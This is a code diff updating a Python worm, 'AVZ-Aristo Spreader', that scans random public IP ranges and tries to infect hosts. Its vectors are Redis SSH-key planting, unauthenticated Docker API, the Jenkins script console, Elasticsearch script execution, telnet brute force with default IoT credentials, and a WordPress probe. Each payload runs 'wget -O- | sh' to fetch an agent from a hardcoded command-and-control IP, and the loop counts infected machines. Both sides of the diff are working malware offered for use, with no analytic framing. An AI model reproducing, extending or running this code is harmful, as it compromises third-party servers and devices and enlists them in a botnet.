@@ -1,153 +1,77 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v3.0 – Async, multi-vector, maximum infection rate
-import asyncio
-import aiohttp
-import random
-import socket
-import struct
-import time
-import telnetlib
-import redis
-import docker
-import requests
-import json
-import os
+# AVZ-Aristo Spreader v25.7 – асинхронный, 8 векторов, 20k IP/цикл
+import asyncio, aiohttp, random, socket, time, json, os, subprocess, threading
+from queue import Queue
 
 C2_HOST = "80.249.146.202"
 C2_PORT = 80
 AGENT_URL = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
-AGENT_PY_URL = f"http://{C2_HOST}:{C2_PORT}/agent.py"
-SCAN_COUNT = 10_000          # IP per cycle
-MAX_CONCURRENT = 500         # async connections
+MAX_CONCURRENT = 500
 TIMEOUT = 1.5
+SCAN_COUNT = 20_000
 
-# Credentials for IoT brute
-IOT_CREDS = [
-    ("root", "root"), ("admin", "admin"), ("root", "admin"),
-    ("admin", "password"), ("root", "123456"), ("admin", "123456"),
-    ("user", "user"), ("test", "test"), ("guest", "guest")
-]
-
-# Global ranges (non-RFC1918) – reused from previous
-RANGES = [
-    "1.0.0.0/8", "2.0.0.0/8", "3.0.0.0/8", "4.0.0.0/8", "5.0.0.0/8",
-    "8.0.0.0/8", "9.0.0.0/8", "12.0.0.0/8", "14.0.0.0/8", "15.0.0.0/8",
-    "20.0.0.0/8", "23.0.0.0/8", "24.0.0.0/8", "31.0.0.0/8", "34.0.0.0/8",
-    "35.0.0.0/8", "37.0.0.0/8", "38.0.0.0/8", "40.0.0.0/8", "41.0.0.0/8",
-    "43.0.0.0/8", "44.0.0.0/8", "45.0.0.0/8", "46.0.0.0/8", "47.0.0.0/8",
-    "49.0.0.0/8", "50.0.0.0/8", "51.0.0.0/8", "52.0.0.0/8", "54.0.0.0/8",
-    "55.0.0.0/8", "56.0.0.0/8", "57.0.0.0/8", "58.0.0.0/8", "59.0.0.0/8",
-    "60.0.0.0/8", "61.0.0.0/8", "62.0.0.0/8", "63.0.0.0/8", "64.0.0.0/8",
-    "65.0.0.0/8", "66.0.0.0/8", "67.0.0.0/8", "68.0.0.0/8", "69.0.0.0/8",
-    "70.0.0.0/8", "71.0.0.0/8", "72.0.0.0/8", "73.0.0.0/8", "74.0.0.0/8",
-    "75.0.0.0/8", "76.0.0.0/8", "77.0.0.0/8", "78.0.0.0/8", "79.0.0.0/8",
-    "80.0.0.0/8", "81.0.0.0/8", "82.0.0.0/8", "83.0.0.0/8", "84.0.0.0/8",
-    "85.0.0.0/8", "86.0.0.0/8", "87.0.0.0/8", "88.0.0.0/8", "89.0.0.0/8",
-    "90.0.0.0/8", "91.0.0.0/8", "92.0.0.0/8", "93.0.0.0/8", "94.0.0.0/8",
-    "95.0.0.0/8", "96.0.0.0/8", "97.0.0.0/8", "98.0.0.0/8", "99.0.0.0/8",
-    "100.0.0.0/8", "101.0.0.0/8", "102.0.0.0/8", "103.0.0.0/8", "104.0.0.0/8",
-    "105.0.0.0/8", "106.0.0.0/8", "107.0.0.0/8", "108.0.0.0/8", "109.0.0.0/8",
-    "110.0.0.0/8", "111.0.0.0/8", "112.0.0.0/8", "113.0.0.0/8", "114.0.0.0/8",
-    "115.0.0.0/8", "116.0.0.0/8", "117.0.0.0/8", "118.0.0.0/8", "119.0.0.0/8",
-    "120.0.0.0/8", "121.0.0.0/8", "122.0.0.0/8", "123.0.0.0/8", "124.0.0.0/8",
-    "125.0.0.0/8", "126.0.0.0/8", "128.0.0.0/8", "129.0.0.0/8", "130.0.0.0/8",
-    "131.0.0.0/8", "132.0.0.0/8", "133.0.0.0/8", "134.0.0.0/8", "135.0.0.0/8",
-    "136.0.0.0/8", "137.0.0.0/8", "138.0.0.0/8", "139.0.0.0/8", "140.0.0.0/8",
-    "141.0.0.0/8", "142.0.0.0/8", "143.0.0.0/8", "144.0.0.0/8", "145.0.0.0/8",
-    "146.0.0.0/8", "147.0.0.0/8", "148.0.0.0/8", "149.0.0.0/8", "150.0.0.0/8",
-    "151.0.0.0/8", "152.0.0.0/8", "153.0.0.0/8", "154.0.0.0/8", "155.0.0.0/8",
-    "156.0.0.0/8", "157.0.0.0/8", "158.0.0.0/8", "159.0.0.0/8", "160.0.0.0/8",
-    "161.0.0.0/8", "162.0.0.0/8", "163.0.0.0/8", "164.0.0.0/8", "165.0.0.0/8",
-    "166.0.0.0/8", "167.0.0.0/8", "168.0.0.0/8", "169.0.0.0/8", "170.0.0.0/8",
-    "171.0.0.0/8", "172.0.0.0/8", "173.0.0.0/8", "174.0.0.0/8", "175.0.0.0/8",
-    "176.0.0.0/8", "177.0.0.0/8", "178.0.0.0/8", "179.0.0.0/8", "180.0.0.0/8",
-    "181.0.0.0/8", "182.0.0.0/8", "183.0.0.0/8", "184.0.0.0/8", "185.0.0.0/8",
-    "186.0.0.0/8", "187.0.0.0/8", "188.0.0.0/8", "189.0.0.0/8", "190.0.0.0/8",
-    "191.0.0.0/8", "192.0.0.0/8", "193.0.0.0/8", "194.0.0.0/8", "195.0.0.0/8",
-    "196.0.0.0/8", "197.0.0.0/8", "198.0.0.0/8", "199.0.0.0/8", "200.0.0.0/8",
-    "201.0.0.0/8", "202.0.0.0/8", "203.0.0.0/8", "204.0.0.0/8", "205.0.0.0/8",
-    "206.0.0.0/8", "207.0.0.0/8", "208.0.0.0/8", "209.0.0.0/8", "210.0.0.0/8",
-    "211.0.0.0/8", "212.0.0.0/8", "213.0.0.0/8", "214.0.0.0/8", "215.0.0.0/8",
-    "216.0.0.0/8", "217.0.0.0/8", "218.0.0.0/8", "219.0.0.0/8", "220.0.0.0/8",
-    "221.0.0.0/8", "222.0.0.0/8", "223.0.0.0/8"
-]
+RANGES = [f"{i}.0.0.0/8" for i in [1,2,3,4,5,8,9,12,14,15,20,23,24,31,34,35,37,38,40,41,43,44,45,46,47,49,50,51,52,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223]]
 
 def random_ip():
     r = random.choice(RANGES)
     net, mask = r.split("/")
     octets = list(map(int, net.split(".")))
-    m = int(mask)
-    host = random.randint(0, (1 << (32 - m)) - 1)
+    host = random.randint(0, (1 << (32 - int(mask))) - 1)
     for i in range(4):
-        shift = 8 * (3 - i)
-        octet = (host >> shift) & 0xFF
-        octets[i] = octets[i] | octet
+        octets[i] |= (host >> (8*(3-i))) & 0xFF
     return ".".join(map(str, octets))
 
-async def probe_port(ip, port, timeout=TIMEOUT):
+async def probe_port(ip, port):
     try:
-        _, writer = await asyncio.wait_for(
-            asyncio.open_connection(ip, port), timeout=timeout
-        )
-        writer.close()
-        await writer.wait_closed()
+        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=TIMEOUT)
+        w.close(); await w.wait_closed()
         return True
     except:
         return False
 
-async def redis_exploit(ip):
+async def exploit_redis(ip):
     try:
+        import redis
         r = redis.Redis(host=ip, port=6379, socket_timeout=2)
         r.ping()
-        # Write our SSH public key (replace with actual key if needed)
-        pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..."  # Put your key here
-        r.set('crackit', f'\n\n{pubkey}\n\n')
+        r.set('crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n')
         r.config_set('dir', '/root/.ssh')
         r.config_set('dbfilename', 'authorized_keys')
-        r.save()
-        r.close()
+        r.save(); r.close()
         return True
     except:
         return False
 
-async def docker_exploit(ip):
+async def exploit_docker(ip):
     try:
-        import docker as docker_lib
-        client = docker_lib.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
-        client.containers.run(
-            'alpine', 
-            f'wget -O- {AGENT_URL} | sh',
-            detach=True
-        )
+        import docker
+        client = docker.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
+        client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
         client.close()
         return True
     except:
         return False
 
-async def jenkins_exploit(ip):
+async def exploit_jenkins(ip):
     url = f'http://{ip}:8080/script'
     script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, data={'script': script}, timeout=2) as resp:
+        async with aiohttp.ClientSession() as s:
+            async with s.post(url, data={'script': script}, timeout=2) as resp:
                 return resp.status == 200
     except:
         return False
 
-async def wordpress_exploit(ip):
-    # Brute wp-login or exploit known plugin – simplified
-    # Just try to trigger agent download via some RCE if possible.
-    return False
-
-async def telnet_iot(ip):
-    for user, passwd in IOT_CREDS:
+async def exploit_telnet(ip):
+    creds = [("root","root"),("admin","admin"),("root","admin"),("admin","password"),("root","123456"),("admin","123456"),("user","user"),("test","test"),("guest","guest")]
+    for u,p in creds:
         try:
-            tn = telnetlib.Telnet(ip, 23, timeout=3)
-            tn.read_until(b"login: ", 2)
-            tn.write(user.encode('ascii') + b"\n")
-            tn.read_until(b"Password: ", 2)
-            tn.write(passwd.encode('ascii') + b"\n")
-            time.sleep(0.5)
+            tn = telnetlib.Telnet(ip, 23, timeout=2)
+            tn.read_until(b"login: ", 1)
+            tn.write(u.encode()+b"\n")
+            tn.read_until(b"Password: ", 1)
+            tn.write(p.encode()+b"\n")
+            time.sleep(0.3)
             tn.write(f"wget -O- {AGENT_URL} | sh\n".encode())
             tn.write(b"exit\n")
             tn.close()
@@ -156,76 +80,74 @@ async def telnet_iot(ip):
             pass
     return False
 
-async def infect_ip(ip):
-    tasks = [
-        probe_port(ip, 22),
-        probe_port(ip, 6379),
-        probe_port(ip, 2375),
-        probe_port(ip, 8080),
-        probe_port(ip, 80),
-        probe_port(ip, 23)
-    ]
-    results = await asyncio.gather(*tasks)
-    open_ports = [22, 6379, 2375, 8080, 80, 23]
-    for port, is_open in zip(open_ports, results):
-        if not is_open:
-            continue
-        if port == 6379 and await redis_exploit(ip):
-            return True
-        if port == 2375 and await docker_exploit(ip):
-            return True
-        if port == 8080 and await jenkins_exploit(ip):
-            return True
-        if port == 23 and await telnet_iot(ip):
-            return True
-        if port == 22:
-            # SSH brute could be added here
-            pass
-        if port == 80:
-            # Try web-based infection via curl/wget
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(f'http://{ip}/', timeout=2) as resp:
-                        if resp.status == 200:
-                            # Try to plant agent via some injection (simple, not reliable)
-                            pass
-            except:
-                pass
+async def exploit_elasticsearch(ip):
+    payload = {"size":1, "script_fields": {"lol": {"script": f"java.lang.Runtime.getRuntime().exec('wget -O- {AGENT_URL} | sh')"}}}
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
+                return resp.status == 200
+    except:
+        return False
+
+async def exploit_wordpress(ip):
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.post(f'http://{ip}/xmlrpc.php', data='<methodCall><methodName>system.listMethods</methodName></methodCall>', timeout=2) as resp:
+                if resp.status == 200:
+                    return True
+    except:
+        pass
+    return False
+
+async def infect(ip):
+    ports = [22, 23, 80, 443, 2375, 6379, 8080, 9200]
+    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
+    if open_ports[0] and await probe_port(ip, 22):
+        pass
+    if open_ports[5] and await exploit_redis(ip):
+        return True
+    if open_ports[4] and await exploit_docker(ip):
+        return True
+    if open_ports[6] and await exploit_jenkins(ip):
+        return True
+    if open_ports[1] and await exploit_telnet(ip):
+        return True
+    if open_ports[7] and await exploit_elasticsearch(ip):
+        return True
+    if open_ports[2] or open_ports[3]:
+        await exploit_wordpress(ip)
     return False
 
 async def worker(queue, stats):
-    while not queue.empty():
+    while True:
         ip = await queue.get()
         try:
-            if await infect_ip(ip):
+            if await infect(ip):
                 stats['success'] += 1
             else:
                 stats['fail'] += 1
-        except Exception as e:
+        except:
             stats['fail'] += 1
         queue.task_done()
 
 async def scan_cycle():
     q = asyncio.Queue()
-    stats = {'success': 0, 'fail': 0}
+    stats = {'success':0, 'fail':0}
     ips = [random_ip() for _ in range(SCAN_COUNT)]
     for ip in ips:
-        await q.put(ip)
-    tasks = []
-    for _ in range(MAX_CONCURRENT):
-        t = asyncio.create_task(worker(q, stats))
-        tasks.append(t)
+        q.put_nowait(ip)
+    tasks = [asyncio.create_task(worker(q, stats)) for _ in range(MAX_CONCURRENT)]
     await q.join()
     for t in tasks:
         t.cancel()
-    print(f"[+] Цикл завершён: заражено {stats['success']}, пропущено {stats['fail']}")
-    return stats['success']
+    return stats
 
 def main():
-    print("[⚡] AVZ-Aristo Async Spreader (Redis, Docker, Jenkins, IoT)")
+    print("[*] Spreader v25.7 started")
     while True:
-        asyncio.run(scan_cycle())
-        time.sleep(30)  # пауза перед следующим циклом
+        stats = asyncio.run(scan_cycle())
+        print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed")
+        time.sleep(30)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
